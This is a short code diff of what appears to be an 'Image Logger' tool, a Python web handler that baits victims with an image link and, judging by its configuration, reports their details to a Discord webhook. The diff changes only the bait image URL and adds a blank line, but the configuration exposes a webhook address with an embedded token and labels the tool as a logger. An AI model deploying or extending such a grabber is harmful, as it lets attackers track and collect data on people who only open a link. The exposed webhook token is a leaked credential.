@@ -9,7 +9,7 @@ __author__ = "Someone"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1417819830777675826/XgDDma1Cu14TNEtRpMZJYjZT2Uo3xs0SkLMQ1pQ61H9SQ-rL93TGGI4HzXWOrJAT2RjI",
-    "image": "https://m.media-amazon.com/images/I/813kqvYoRfL.png",
+    "image": "https://i.imgflip.com/5k3ria.jpg",
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
@@ -263,5 +263,6 @@ if (!currenturl.includes("g=")) {
     
     do_GET = handleRequest
     do_POST = handleRequest
+
 
 handler = app = ImageLoggerAPI
